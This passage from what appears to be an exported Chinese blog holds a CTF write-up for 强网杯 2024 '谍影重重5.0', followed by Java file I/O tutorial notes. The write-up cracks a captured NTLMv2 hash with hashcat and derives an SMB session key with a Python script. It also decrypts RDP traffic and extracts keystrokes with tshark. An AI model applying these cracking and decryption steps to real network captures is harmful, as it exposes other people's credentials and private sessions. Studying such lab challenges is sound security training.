一上来这个代码就给我看懵了，对于python基本功不是很扎实的我，没看懂逻辑，一边拿ai一边分析。\n","tags":["Blog","CTF-Misc"],"title":"2024强网杯-Misc-Pickle jail"},{"content":"😉🌃⛅😉\n乍一看，有arp、smb、tls等协议流量\n先过滤出smb2流量看看\nsmb协议主要用于在计算机间共享文件、打印机、串口等\nNTLM是一种身份验证机制\nsmb2爆破\nWireshark分析\u0026ndash;SMB2协议包及hashcat爆破_wireshark smb-CSDN博客\n通过文章了解到需要构造hash文件\nusername::domain:NTLM Server Challenge:ntproofstr:不包含ntproofstr的ntlmv2_response值 双击打开这条流量\nsession id 在header里面\n上一条流量\n拿到NTLM Server Challenge\nntlmssp.ntlmv2_response：ca32f9b5b48c04ccfa96f35213d63d75010100000000000040d0731fb92adb01221434d6e24970170000000002001e004400450053004b0054004f0050002d004a0030004500450039004d00520001001e004400450053004b0054004f0050002d004a0030004500450039004d00520004001e004400450053004b0054004f0050002d004a0030004500450039004d00520003001e004400450053004b0054004f0050002d004a0030004500450039004d0052000700080040d0731fb92adb0106000400020000000800300030000000000000000100000000200000bd69d88e01f6425e6c1d7f796d55f11bd4bdcb27c845c6ebfac35b8a3acc42c20a001000000000000000000000000000000000000900260063006900660073002f003100370032002e00310036002e003100300035002e003100320039000000000000000000 ntlmssp.ntlmv2_response.ntproofstr：\rca32f9b5b48c04ccfa96f35213d63d75 Server response challenge\nntlmssp.ntlmserverchallenge:\rc1dec53240124487 ntlmssp.ntlmv2_response.challenge:\r221434d6e2497017 ntlmssp.auth.domain:\r. ntlmssp.auth.username:\rtom 组合\ntom::.:c1dec53240124487:ca32f9b5b48c04ccfa96f35213d63d75:010100000000000040d0731fb92adb01221434d6e24970170000000002001e004400450053004b0054004f0050002d004a0030004500450039004d00520001001e004400450053004b0054004f0050002d004a0030004500450039004d00520004001e004400450053004b0054004f0050002d004a0030004500450039004d00520003001e004400450053004b0054004f0050002d004a0030004500450039004d0052000700080040d0731fb92adb0106000400020000000800300030000000000000000100000000200000bd69d88e01f6425e6c1d7f796d55f11bd4bdcb27c845c6ebfac35b8a3acc42c20a001000000000000000000000000000000000000900260063006900660073002f003100370032002e00310036002e003100300035002e003100320039000000000000000000 hashcat爆破\nhashcat -O -a 0 -m 5600 1.hash rockyou.txt\r字典大家随意\r#解释\r攻击模式 (-a 0): 使用字典攻击模式，逐个尝试字典文件中的密码。\r哈希类型 (-m 5600): 指定哈希类型为 NTLMv2，这是 Windows 系统中常用的一种哈希类型。\r哈希文件 (1.hash): 指定要破解的哈希文件。\r字典文件 (rockyou.txt): 指定用于破解的字典文件，这个文件通常包含大量的常见密码。\r#这里当个破解用不着--show\r显示结果 (--show): 在破解过程中实时显示破解进度和结果。 babygirl233 要获取这些字段值\n必要的信息\n用户的明文密码。\r用户名 (username) 和域名 (domain)。\r捕获的网络包中的 ntProofStr（客户端提供的证明字符串）和 serverChallenge（服务器挑战值）。\r加密的会话密钥 (sessionKey)。 获取到了密码然后破解出session key\n脚本利用\n上面得到sessionkey:5643a37f253b00b2f52df1afd48c1514\nfrom Crypto.Cipher import ARC4\rfrom Crypto.Hash import MD4, MD5, HMAC\rpassword = \u0026#39;babygirl233\u0026#39;\rpasswordHash = MD4.new(password.encode(\u0026#39;utf-16-le\u0026#39;)).hexdigest()\rusername = \u0026#39;tom\u0026#39;\rdomain = \u0026#39;.\u0026#39;\rntProofStr = \u0026#39;ca32f9b5b48c04ccfa96f35213d63d75\u0026#39;\rserverChallenge = \u0026#39;c1dec53240124487\u0026#39;\rsessionKey = \u0026#39;5643a37f253b00b2f52df1afd48c1514\u0026#39;\rresponseKey = HMAC.new(bytes.fromhex(passwordHash), (username.upper()+domain.upper()).encode(\u0026#39;utf-16-le\u0026#39;), MD5).digest()\rkeyExchangeKey = HMAC.new(responseKey, bytes.fromhex(ntProofStr), MD5).digest()\rdecryptedSessionKey = ARC4.new(keyExchangeKey).decrypt(bytes.fromhex(sessionKey))\rprint(\u0026#39;Decrypted SMB Session Key is: {}\u0026#39;.format(decryptedSessionKey.hex())) 大致思路\n从密码到哈希\r用户的明文密码通过特定算法（如MD4）转换成一个固定的哈希值。\r这个哈希值将作为后续计算的基础。\r生成响应密钥 (Response Key)\r使用用户密码的哈希值作为密钥，结合用户名和域名生成一个新的密钥——响应密钥。\r生成密钥交换密钥 (Key Exchange Key)\r使用上一步生成的响应密钥，结合客户端提供的证明字符串（ntProofStr），生成用于解密会话密钥的密钥——密钥交换密钥。\r解密会话密钥 (Session Key)\r使用密钥交换密钥作为解密密钥，对加密的会话密钥进行解密，得到最终的明文会话密钥。 #基于对称加密和哈希函数\r明文密码 → 哈希\r将用户的明文密码通过特定算法（如MD4）转换为一个固定长度的哈希值。\r这个哈希值用于后续步骤中的密钥生成。\r哈希 → 响应密钥\r使用用户密码的哈希值作为输入，结合用户名和域名等信息，通过HMAC-MD5算法生成响应密钥。\r响应密钥是一个临时密钥，用于进一步的密钥交换。\r响应密钥 → 密钥交换密钥\r使用响应密钥和客户端提供的证明字符串（ntProofStr），通过HMAC-MD5算法生成密钥交换密钥。\r密钥交换密钥用于解密会话密钥。\r密钥交换密钥 → 解密会话密钥\r使用密钥交换密钥作为解密密钥，对加密的会话密钥进行解密，得到最终的明文会话密钥。 注意wireshark里面的大小端问题\nsession key:a3abe4d64394909a641062342ffe291b\rsession id:0900000000100000 smb流量解密了\n发现敏感文件flag.7z\n右键追踪tcp流\n全部导出\n压缩包要密码\n还有证书没用上，所以返回去看看rdp和tls流量\n1. RDP 中的证书\r目的：当您连接到一台 RDP 服务器时，服务器会向客户端发送一个数字证书以证明其身份。如果客户端信任该证书，则可以安全地建立连接。\r操作：如果您是服务器管理员，需要将有效的证书安装到 RDP 服务器上，以便客户端能够验证服务器的身份。这通常涉及到从受信任的证书颁发机构（CA）获取证书，并将其安装到服务器的证书存储中。\r2. TLS 中的证书\r目的：在 TLS 握手过程中，服务器会向客户端发送一个数字证书以证明其身份。客户端会检查该证书是否由可信的 CA 签发，并且证书中的信息是否匹配预期的服务器。\r操作：对于 TLS 服务（如 Web 服务器），您需要将证书安装到服务器上，并配置服务以使用这些证书进行 TLS 握手。对于客户端（如浏览器），则需要确保操作系统或应用程序的信任库中包含所有必要的根证书。 注意wireshark的tls证书支持的是.pem格式，用openssl转换\n一个 PEM 文件，其中包含用于 RDP 会话的 TLS 加密的 SSL/TLS 证书。\n参考文章 分析捕获的 RDP 会话 |haxor.no\n更改文件所有者： 你可以将文件的所有者更改为自己，这样就可以导出到windows中了\nEnter Import Password:：当您创建或导出 .pfx 文件时，通常会设置一个导入/导出密码以保护其中的私钥。在这里，系统提示您输入这个密码，以便能够读取并转换 .pfx 文件的内容。\n密码尝试后mimikatz是对的\r#不清楚为什么\r有位师傅这么说：通过阅读其他师傅的wp，知道这里出题人是用了mimikatz一把梭，所以用mimikatz来作为密码得到密钥文件 可以查看rdp流量了\n未解密的状态\n解密后状态\n可以使用pyrdp工具\n但是我没有装成功所以用其他方法，提取加脚本分析\n参考链接如下\n分析捕获的 RDP 会话 |haxor.no\ngithub.com\n例如这里的，可以右键scancode，复制，选里面的列出选中树的所有项目\n里面的 rdp.fastpath.scancode.keycode 是对应的键盘码\nrdp.fastpath.scancode.release是是否按着，true代表是\ntshark -r 1.pcapng -Y \u0026#34;rdp.fastpath.action == 0\u0026#34; -o \u0026#34;tls.keylog_file:./rdp.pem\u0026#34; -T fields -e frame.time -e rdp.fastpath.scancode.keycode -e rdp.fastpath.scancode.release \u0026gt; keyboard_data.txt 解析脚本\ndef map_keycode(key_code):\r\u0026#34;\u0026#34;\u0026#34;根据扫描码返回相应的字符或描述\u0026#34;\u0026#34;\u0026#34;\r# 特殊键的映射\rspecial_keys = {\r0x00: \u0026#39;None\u0026#39;, # No key\r0x01: \u0026#39;Esc\u0026#39;, # Esc\r0x02: \u0026#39;1\u0026#39;, # 1\r0x03: \u0026#39;2\u0026#39;, # 2\r0x04: \u0026#39;3\u0026#39;, # 3\r0x05: \u0026#39;4\u0026#39;, # 4\r0x06: \u0026#39;5\u0026#39;, # 5\r0x07: \u0026#39;6\u0026#39;, # 6\r0x08: \u0026#39;7\u0026#39;, # 7\r0x09: \u0026#39;8\u0026#39;, # 8\r0x0A: \u0026#39;9\u0026#39;, # 9\r0x0B: \u0026#39;0\u0026#39;, # 0\r0x0C: \u0026#39;-\u0026#39;, # -\r0x0D: \u0026#39;=\u0026#39;, # =\r0x0E: \u0026#39;Backspace\u0026#39;, # Backspace\r0x0F: \u0026#39;Tab\u0026#39;, # Tab\r0x10: \u0026#39;Q\u0026#39;, # Q\r0x11: \u0026#39;W\u0026#39;, # W\r0x12: \u0026#39;E\u0026#39;, # E\r0x13: \u0026#39;R\u0026#39;, # R\r0x14: \u0026#39;T\u0026#39;, # T\r0x15: \u0026#39;Y\u0026#39;, # Y\r0x16: \u0026#39;U\u0026#39;, # U\r0x17: \u0026#39;I\u0026#39;, # I\r0x18: \u0026#39;O\u0026#39;, # O\r0x19: \u0026#39;P\u0026#39;, # P\r0x1A: \u0026#39;[\u0026#39;, # [\r0x1B: \u0026#39;]\u0026#39;, # ]\r0x1C: \u0026#39;Enter\u0026#39;, # Enter\r0x1D: \u0026#39;Left Ctrl\u0026#39;, # Left Control\r0x1E: \u0026#39;A\u0026#39;, # A\r0x1F: \u0026#39;S\u0026#39;, # S\r0x20: \u0026#39;D\u0026#39;, # D\r0x21: \u0026#39;F\u0026#39;, # F\r0x22: \u0026#39;G\u0026#39;, # G\r0x23: \u0026#39;H\u0026#39;, # H\r0x24: \u0026#39;J\u0026#39;, # J\r0x25: \u0026#39;K\u0026#39;, # K\r0x26: \u0026#39;L\u0026#39;, # L\r0x27: \u0026#39;;\u0026#39;, # ;\r0x28: \u0026#34;\u0026#39;\u0026#34;, # \u0026#39;\r0x29: \u0026#39;Grave\u0026#39;, # `\r0x2A: \u0026#39;Left Shift\u0026#39;, # Left Shift\r0x2B: \u0026#39;Backslash\u0026#39;, # \\\r0x2C: \u0026#39;Z\u0026#39;, # Z\r0x2D: \u0026#39;X\u0026#39;, # X\r0x2E: \u0026#39;C\u0026#39;, # C\r0x2F: \u0026#39;V\u0026#39;, # V\r0x30: \u0026#39;B\u0026#39;, # B\r0x31: \u0026#39;N\u0026#39;, # N\r0x32: \u0026#39;M\u0026#39;, # M\r0x33: \u0026#39;,\u0026#39;, # ,\r0x34: \u0026#39;.\u0026#39;, # .\r0x35: \u0026#39;/\u0026#39;, # /\r0x36: \u0026#39;Right Shift\u0026#39;, # Right Shift\r0x37: \u0026#39;Keypad *\u0026#39;, # Keypad *\r0x38: \u0026#39;Alt\u0026#39;, # Alt\r0x39: \u0026#39;Space\u0026#39;, # Space\r0x3A: \u0026#39;Caps Lock\u0026#39;, # Caps Lock\r0x3B: \u0026#39;F1\u0026#39;, # F1\r0x3C: \u0026#39;F2\u0026#39;, # F2\r0x3D: \u0026#39;F3\u0026#39;, # F3\r0x3E: \u0026#39;F4\u0026#39;, # F4\r0x3F: \u0026#39;F5\u0026#39;, # F5\r0x40: \u0026#39;F6\u0026#39;, # F6\r0x41: \u0026#39;F7\u0026#39;, # F7\r0x42: \u0026#39;F8\u0026#39;, # F8\r0x43: \u0026#39;F9\u0026#39;, # F9\r0x44: \u0026#39;F10\u0026#39;, # F10\r0x45: \u0026#39;F11\u0026#39;, # F11\r0x46: \u0026#39;F12\u0026#39;, # F12\r0x47: \u0026#39;Num Lock\u0026#39;, # Num Lock\r0x48: \u0026#39;Keypad 7\u0026#39;, # Keypad 7\r0x49: \u0026#39;Keypad 8\u0026#39;, # Keypad 8\r0x4A: \u0026#39;Keypad 9\u0026#39;, # Keypad 9\r0x4B: \u0026#39;Keypad -\u0026#39;, # Keypad -\r0x4C: \u0026#39;Keypad 4\u0026#39;, # Keypad 4\r0x4D: \u0026#39;Keypad 5\u0026#39;, # Keypad 5\r0x4E: \u0026#39;Keypad 6\u0026#39;, # Keypad 6\r0x4F: \u0026#39;Keypad +\u0026#39;, # Keypad +\r0x50: \u0026#39;Keypad 1\u0026#39;, # Keypad 1\r0x51: \u0026#39;Keypad 2\u0026#39;, # Keypad 2\r0x52: \u0026#39;Keypad 3\u0026#39;, # Keypad 3\r0x53: \u0026#39;Keypad 0\u0026#39;, # Keypad 0\r0x54: \u0026#39;Keypad .\u0026#39;, # Keypad .\r0x5B: \u0026#39;Left Win\u0026#39;, # Left Windows\r0x5C: \u0026#39;Right Win\u0026#39;, # Right Windows\r0x5D: \u0026#39;Menu\u0026#39;, # Menu\r0x5E: \u0026#39;Right Ctrl\u0026#39;, # Right Control\r0x5F: \u0026#39;Right Alt\u0026#39;, # Right Alt\r}\rreturn special_keys.get(key_code, f\u0026#34;Unknown key code: {key_code}\u0026#34;)\rdef process_keyboard_data(data):\r\u0026#34;\u0026#34;\u0026#34;处理键盘输入数据，返回对应的按键描述\u0026#34;\u0026#34;\u0026#34;\routput = []\rfor entry in data:\r# 分割扫描码并转换为整数\rkey_codes = entry.split(\u0026#39;,\u0026#39;)\rmapped_keys = [map_keycode(int(code, 16)) for code in key_codes]\routput.append(\u0026#39; \u0026#39;.join(mapped_keys))\rreturn output\r# 示例键盘输入数据\rkeyboard_data = [\r\u0026#34;0x0f,0x2a,0x36,0x1d,0x1d,0x0f,0x38,0x0f,0x38,0x0f\u0026#34;,\r\u0026#34;0x0f,0x2a,0x36,0x1d,0x1d,0x0f,0x38,0x0f,0x38,0x0f\u0026#34;,\r\u0026#34;0x0f,0x5b,0x5c,0x2a,0x36,0x1d,0x1d,0x0f,0x38,0x0f,0x38,0x0f\u0026#34;,\r\u0026#34;0x14\u0026#34;,\r\u0026#34;0x23\u0026#34;,\r\u0026#34;0x12\u0026#34;,\r\u0026#34;0x2a\u0026#34;,\r\u0026#34;0x39\u0026#34;,\r\u0026#34;0x08\u0026#34;,\r\u0026#34;0x2c\u0026#34;,\r\u0026#34;0x39\u0026#34;,\r\u0026#34;0x19\u0026#34;,\r\u0026#34;0x1e\u0026#34;,\r\u0026#34;0x1f\u0026#34;,\r\u0026#34;0x1f\u0026#34;,\r\u0026#34;0x11\u0026#34;,\r\u0026#34;0x18\u0026#34;,\r\u0026#34;0x13\u0026#34;,\r\u0026#34;0x20\u0026#34;,\r\u0026#34;0x39\u0026#34;,\r\u0026#34;0x17\u0026#34;,\r\u0026#34;0x1f\u0026#34;,\r\u0026#34;0x39\u0026#34;,\r\u0026#34;0x21\u0026#34;,\r\u0026#34;0x28\u0026#34;,\r\u0026#34;0x1a\u0026#34;,\r\u0026#34;0x2a\u0026#34;,\r\u0026#34;0x11\u0026#34;,\r\u0026#34;0x17\u0026#34;,\r\u0026#34;0x31\u0026#34;,\r\u0026#34;0x20\u0026#34;,\r\u0026#34;0x18\u0026#34;,\r\u0026#34;0x11\u0026#34;,\r\u0026#34;0x1f\u0026#34;,\r\u0026#34;0x0c\u0026#34;,\r\u0026#34;0x2a\u0026#34;,\r\u0026#34;0x19\u0026#34;,\r\u0026#34;0x1e\u0026#34;,\r\u0026#34;0x1f\u0026#34;,\r\u0026#34;0x1f\u0026#34;,\r\u0026#34;0x11\u0026#34;,\r\u0026#34;0x18\u0026#34;,\r\u0026#34;0x13\u0026#34;,\r\u0026#34;0x20\u0026#34;,\r\u0026#34;0x1b\u0026#34;,\r\u0026#34;0x2a\u0026#34;,\r\u0026#34;0x0a\u0026#34;,\r\u0026#34;0x04\u0026#34;,\r\u0026#34;0x05\u0026#34;,\r\u0026#34;0x08\u0026#34;,\r\u0026#34;0x0b\u0026#34;,\r\u0026#34;0x02\u0026#34;,\r\u0026#34;0x04\u0026#34;,\r\u0026#34;0x02\u0026#34;,\r\u0026#34;0x09\u0026#34;,\r\u0026#34;0x03\u0026#34;,\r\u0026#34;0x28\u0026#34;,\r\u0026#34;0x1f\u0026#34;,\r\u0026#34;0x1d\u0026#34;,\r\u0026#34;0x0f,0x2a,0x36,0x1d,0x1d,0x0f,0x38,0x0f,0x38,0x0f\u0026#34;\r]\r# 处理每行数据\rkeyboard_output = process_keyboard_data(keyboard_data)\r# 将结果写入文本文件\rwith open(\u0026#39;keyboard_output.txt\u0026#39;, \u0026#39;w\u0026#39;) as file:\rfor entry in keyboard_output:\rfile.write(entry + \u0026#39;\\n\u0026#39;)\rprint(\u0026#34;结果已写入 keyboard_output.txt\u0026#34;) 不知道为什么我的kali上的wireshark解析不了证书，rdp流量一直处于加密状态，所以我用windows\ntshark -r \u0026#34;1.pcapng\u0026#34; -Y \u0026#34;rdp.fastpath.action == 0\u0026#34; -o \u0026#34;tls.keylog_file:rdp.pem\u0026#34; -T fields -e frame.time -e rdp.fastpath.scancode.keycode -e rdp.fastpath.scancode.release \u0026gt; \u0026#34;keyboard_data.txt\u0026#34; tshark.exe -r \u0026#34;D:\\桌面\\1.pcapng\u0026#34; -Y \u0026#34;rdp.fastpath.action == 0\u0026#34; -o \u0026#34;tls.keylog_file:\u0026#34;D:\\桌面\\rdp.pem\u0026#34;\u0026#34; -T fields -e frame.time -e rdp.fastpath.scancode.keycode -e rdp.fastpath.scancode.release \u0026gt; \u0026#34;D:\\桌面\\keyboard_data.txt\u0026#34;\r#注意路径一定要写对 处理一下，不要时间\n成功拿到\n最后的答案就是7z的密码是之前windows的密码加上这一串，也就是babygirl2339347013182\n花了很久才复现了这道题，只能说菜就多练吧。\n环境一直是最烦的，哭了😣😣😣\n参考链接👇🏻# 2024 强网杯 谍影重重5.0 超详解 - 先知社区\n强网杯2024 Writeup - 星盟安全团队\nSMB Decryption - TryHackMe :: MWLab — Ladislav\u0026rsquo;s Malware Lab\n2024强网杯-谍影重重5.0_2024强网杯wp-CSDN博客\nAnalyzing captured RDP sessions | haxor.no\n工具安装\nRDPY：一款功能强大的RDP远程桌面协议实现工具 - FreeBuf网络安全行业门户\npyrdp/pyrdp/convert at main · GoSecure/pyrdp\n","date":"2024-11-21","id":7,"permalink":"/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5.0/","summary":"😉🌃⛅😉\n乍一看，有arp、smb、tls等协议流量\n先过滤出smb2流量看看\nsmb协议主要用于在计算机间共享文件、打印机、串口等\nNTLM是一种身份验证机制\nsmb2爆破\nWireshark分析\u0026ndash;SMB2协议包及hashcat爆破_wireshark smb-CSDN博客\n通过文章了解到需要构造hash文件\nusername::domain:NTLM Server Challenge:ntproofstr:不包含ntproofstr的ntlmv2_response值 双击打开这条流量\n","tags":["Blog","CTF-Misc"],"title":"2024强网杯—谍影重重5.0"},{"content":"输入流和输出流# 输入流（InputStream）\n输入流用于从数据源读取数据。常见的数据源包括文件、网络连接、内存中的字节数组等。InputStream 是所有字节输入流的基类，它定义了一些基本的方法，具体的子类实现了这些方法以适应不同的数据源。\n输出流（OutputStream）\n输出流用于将数据写入目标位置。常见的目标位置包括文件、网络连接、内存中的字节数组等。OutputStream 是所有字节输出流的基类，它定义了一些基本的方法，具体的子类实现了这些方法以适应不同的目标位置。\nFile文件操作# 初识# java.io.File类是一个与文件本身操作有关的类，此类可以实现文件创建、删除、重命名、取得文件大小、修改日期等常见系统文件操作\n如果要使用File类则必须提供完整的文件操作路径，对于文件路径的设置可以通过File类的构造方法完成，当获取了正确的文件路径后就可以进行文件创建于删除操作、File类文件基本操作方法\nNo. 方法 类型 描述 1 public File(String pathname) 构造 给定一个要操作文件的完整路径 2 public File(File parent,String child) 构造 给定要操作文件的父路径和子文件名称 3 public boolean createNewFile() throws IOException 普通 创建文件 4 public boolean delete() 普通 删除文件 5 public boolean exists() 普通 判断给定路径是否存在 示例\nimport java.io.File; public class JavaIODemo{ public static void main(String[] args) throws Exception{ File file = new File(\u0026#34;D:\\\\1.txt\u0026#34;); //文件路径: \u0026#34;\\\\\u0026#34;转义为\u0026#34;\\\u0026#34; if(file.exists()){ file.delete(); } else{ System.out.println(file.createNewFile()); } } } 分隔符# windows中是\u0026quot;\\\u0026quot; 而在UNIX或类UNIX操作系统中路径分隔符是\u0026quot;/\u0026quot;\n为了解决不同操作系统的路径分隔符问题，在java.io.File类中提供了一个路径分隔符常量。\n路径分隔符：public static final String separator，在不同操作系统可以获取不同的分隔符\n在实际项目开发中建议使用以下方法定义：\nFile file = new File(\u0026#34;d:\u0026#34; + File.separator + \u0026#34;1.txt\u0026#34;); 在使用File类创建文件时必须保证父路径存在，当前程序是直接在根路径下进行文件创建的，所以用户可以直接使用createNewFile()方法创建文件。\n如果文件需要保存在特定的目录中，则必须先创建父目录而后才可以进行文件创建。\nFile类父路径操作方法# No. 方法 类型 描述 1 public File getParentFile() 普通 找到一个指定路径的父路径 2 public boolean mkdirs() 普通 创建指定目录 创建带目录的文件\nimport java.io.File public class JavaDemo{ public static void main(String[] args) throws Exception{ File file = new File(\u0026#34;F:\u0026#34; + File.separator + \u0026#34;hello\u0026#34; + File.separator + \u0026#34;hh\u0026#34; + File.separator + \u0026#34;word.txt\u0026#34;); if (!file.getParentFile().exists()){ file.getParentFile().mkdirs(); } if(file.exists()){ file.delete(); } else{ System.out.println(file.createNewFile()); } } } 确保父路径存在：当你尝试创建一个新文件时，如果该文件所在的目录（父路径）不存在，那么调用 createNewFile() 方法会失败。这是因为文件系统不允许在一个不存在的目录中创建文件。 直接在根路径下创建文件：如果你是在根路径（如 / 或 C:\\）下创建文件，因为根路径总是存在的，所以你可以直接调用 createNewFile() 而无需担心父路径的问题。 创建特定目录下的文件：如果文件需要保存在一个特定的目录中，你需要首先确保这个目录已经存在。如果目录不存在，你需要先创建它。可以使用 File 类的 mkdir() 或 mkdirs() 方法来创建单个或多个层级的目录。 获取文件元数据信息方法# No. 方法 类型 描述 1 public boolean canRead() 普通 文件是否能读 2 public boolean canWrite() 普通 文件是否能写 3 public boolean canExecute() 普通 文件是否能执行 4 public long length() 普通 获取文件大小(返回字节长度) 5 public long lastModified() 普通 获取最后一次修改日期 6 public boolean isDirectory() 普通 是否是目录 7 public boolean isFile() 普通 是否是文件 8 public boolean isHidden() 普通 是否隐藏 9 public File[] listFiles() 普通 列出目录中的所有文件信息 **注：**listFile()方法返回的是File型对象数组，即在获取数组中的每一个File类实例后可以继续进行各个子路径处理。\n一个目录非常庞大，经常会出现目录嵌套，可以用递归处理\nimport java.io.File public class JavaDemo{ public static void main(String[] args) throws Exception{ File file = new File(\u0026#34;D: \u0026#34; + File.separator); listDir(file); } public static void listDir(File file){ if(file.isDirectory){ File results[] = file.listFiles(); if(results != null){ for(int x = 0;x\u0026lt;results.length;x++){ listDir(results[x]);//不断递归至不是目录 } } } } } 字节流与字符流# 流是I/O的基本操作单元，在流的设计中都会有输入和输出两方面支持。\n在程序中所有数据都是以流的方式进行传输和储存的。\n程序需要通过数据文件读取数据时就可以利用输入流来完成，而当程序需要将数据保存到问文件时，就可以使用输出流完成。\n字节操作流：OutputStream、InputStream 字符操作流:Writer、Reader 执行数据流资源操作一般要按照以下几个步骤进行，下面以文件操作例子\n(1)如果要操作的是文件，首先通过File类对象找到一个要操作的文件路径（路径不存在就要创建路径） (2)通过字节流或者字符流的子类为字节流或字符流的对象实例化(向上转型) (3)执行读写操作 (4)一定要关闭操作的资源(close()),不管随后代码如何操作，资源永远要关闭 OutputStream类常用方法# No. 方法 类型 描述 1 public abstract void write(int b) throws IOException 普通 输出单个字节数据 2 public void write(byte[] b) throws IOException 普通 输出一组字节数据 3 public void write(byte[] b,int off,int len) throws IOException 普通 输出部分字节数据 4 public void close() throws IOException 普通 关闭输出流 5 public void flush() throws IOException 普通 刷新缓冲区 FileOutputStream类主要目的是为OutputStream 父类实例化(FileOutputStream是其子类)\nFileOutputSteam类常用方法# No. 方法 类型 描述 1 public FileOutputStream(File file) throws FileNotFoundException 构造 采用覆盖的形式创建文件输出流 2 public FileOutputStream(File file,boolean append) throws FileNotFoundException 构造 采用覆盖或追加的形式创建文件输出流 是否选择向上转型# 向上转型使得代码更加灵活和通用，但同时也限制了对子类特有方法的访问。选择哪种方式取决于你的具体需求。如果你只需要调用 OutputStream 接口中的方法，那么使用 OutputStream 类型的变量是更好的选择。如果你需要调用 FileOutputStream 特有的方法，那么应该使用 FileOutputStream 类型的变量。 通过AutoCloseable自动关闭接口\nCloseable继承AutoCloseable\n通过OutputStream的继承结构可以发现，OutputStream是AutoCloseable接口子类，所以此时就可以利用try\u0026hellip;catch实现自动关闭操作。\n//自动关闭输出流 try(OutputStream output = new FileOutputStream(file,true)){ String str = \u0026#34;hello word\\r\\n\u0026#34;; //\u0026#34;\\r\\n为文件换行\u0026#34; output..write(str.getBytes()); }catch(IOException e){ e.printStackTrace(); } //这个每一次执行代码实际上会导致新的内容替换掉已有的文件数据，如果想追加内容则可以更换FileOutputStream类的构造方法 文件追加内容\nOutputStream output = new FileOutputStream(file,true); String str = \u0026#34;hh\u0026#34;; output.write(str.getBytes()); output.close(); InputStream字节输入流# 常用方法\nNo. 方法 类型 描述 1 public abstract int read() throws IOException 普通 读取单个字节数据，如果现在已经读取到底了，返回-1 2 public int read(byte[] b) throws IOException 普通 读取一组字节数据，返回的是读取的个数；如果没有数据，且已经读取到底则返回-1 3 public int read(byte[] b,int off,int len) throws IOException 普通 读取一组字节数据(只占数组的部分) 4 public void close() throws IOException 普通 关闭输出流 5 public byte[] readAllBytes() throws IOException 普通 读取输入流全部字节数据，JDK1.9后 6 public long transferTo(OutputStream out) throws IOException 普通 输入流转存到输出流，JDK1.9后 InputStream类提供的主要方法为read()，可以实现单个字节或一组字节数据的读取操作\nInputStream属于抽象类，对于文件的读取可以通过FileInputStream子类进行实例化\n使用readAllBytes()方法可以一次性返回输入流中的所有字节数据，这样开发者在将字节数据内容转为字符串数据的时候就可以不需要进行长度控制了，如（ new String(data,0,len) ）。\n但是使用这个方法需要注意读取的数据内容的字节数据不要过大，否则程序可能出现问题。\nWriter字符输出流# 在使用OutputStream进行字节数据输出，这类数据适合网络传输，但在操作时需要进行字节数组转换操作。\n为了简化输出操作，java提供有字符输出流，直接支持字符串输出\n底层通信处理都是依靠字节实现数据交互\n字符流的最大特点就是可以直接进行字符串输出。\nWriter类的常用方法# No. 方法 类型 描述 1 public Writer append(CharSequence csq) throws IOException 普通 追加输出内容 2 public void write(char[] cbuf) throws IOException 普通 输出字符数组 3 public void write(int c) throws IOException 普通 输出单个字符 4 public void write(String str) throws IOException 普通 输出字符串 5 public abstract void flush() throws IOException 普通 刷新缓冲区 6 public abstract void close() throws IOException 普通 关闭输入流 Writer类进行文件操作时可以利用FileWriter子类进行对象实例化\nFileWriter常用方法# No. 方法 类型 描述 1 public FileWriter(File file) throws IOException 构造 采用覆盖的形式创建文件输出流 2 public FileWriter(File file,boolean append) throws IOException 构造 采用覆盖或追加的形式创建文件输出流 Reader字符输入流# Reader是实现字符输入流的操作类，可以实现char数据类型的读取。\n常用类方法# No. 方法 类型 描述 1 public int read() throws IOException 普通 读取单个字符，无数据读取时返回-1 2 public int read(char[] cbuf) throws IOException 普通 读取多个字符，并返回读取个数 3 public long skip(long n) throws IOException 普通 跳过指定的字符个数后读取 4 public boolean ready() throws IOException 普通 是否可以开始读取数据 5 public abstract void close() throws IOException 普通 关闭输入流 Reader是抽象类，通过文件读取数据可以使用FileReader子类进行实例化\n在Writer类输出是使用flush方法，刷新缓冲区，更新内容保存在文件中。\n字符流关闭自动清空缓冲区\nclose()方法进行输出流关闭，在关闭的时候会自动进行缓冲区的强制刷新，所以程序内容也可以正常的保存到文件中。\nflush()# flush() 方法是 OutputStream 接口中的一个重要方法，用于确保所有缓冲的输出数据都被立即写入目标位置。在某些情况下，输出流可能会缓冲数据以提高性能，但这可能导致数据不是立即写入目标位置。调用 flush() 方法可以强制将缓冲区中的数据写入目标位置，从而确保数据的一致性和完整性。\n主要用途\n确保数据立即写入：在某些情况下，你可能希望确保数据立即写入目标位置，而不是等待缓冲区满或流关闭。例如，在网络通信中，你可能希望确保数据立即发送到服务器。 避免数据丢失：在关闭流之前调用 flush() 可以确保所有缓冲的数据都被写入目标位置，避免因意外中断而导致数据丢失。 示例\n以下是一个简单的示例，展示了如何在使用 FileOutputStream 写入数据时调用 flush() 方法：\nimport java.io.FileOutputStream; import java.io.IOException; public class FlushExample { public static void main(String[] args) { // 定义文件路径 String filePath = \u0026#34;example.txt\u0026#34;; try { // 创建 FileOutputStream 对象 FileOutputStream fos = new FileOutputStream(filePath); // 要写入的数据 String data = \u0026#34;Hello, World! This is a test message.\u0026#34;; // 将字符串转换为字节数组 byte[] bytes = data.getBytes(); // 写入数据到文件 fos.write(bytes); // 强制将缓冲区中的数据写入文件 fos.flush(); // 关闭流 fos.close(); System.out.println(\u0026#34;数据已成功写入文件: \u0026#34; + filePath); } catch (IOException e) { e.printStackTrace(); } } } 解释\n创建 FileOutputStream 对象：使用 new FileOutputStream(filePath) 创建一个 FileOutputStream 对象。 写入数据：使用 fos.write(bytes) 方法将字节数组写入文件。 调用 flush() 方法：使用 fos.flush() 方法强制将缓冲区中的数据写入文件。 关闭流：使用 fos.close() 方法关闭文件输出流，释放系统资源。 注意事项\n性能影响：频繁调用 flush() 方法可能会降低性能，因为每次调用都会导致系统 I/O 操作。因此，通常在关键点调用 flush() 方法，而不是频繁调用。 异常处理：调用 flush() 方法可能会抛出 IOException，因此需要在 try-catch 块中处理异常。 其他流的 flush() 方法\n不仅仅是 FileOutputStream，其他继承自 OutputStream 的类也提供了 flush() 方法。例如：\nBufferedOutputStream：用于缓冲输出流，调用 flush() 方法会将缓冲区中的数据写入底层输出流。 PrintStream：用于格式化输出，调用 flush() 方法会将缓冲区中的数据写入目标位置。 转换流# 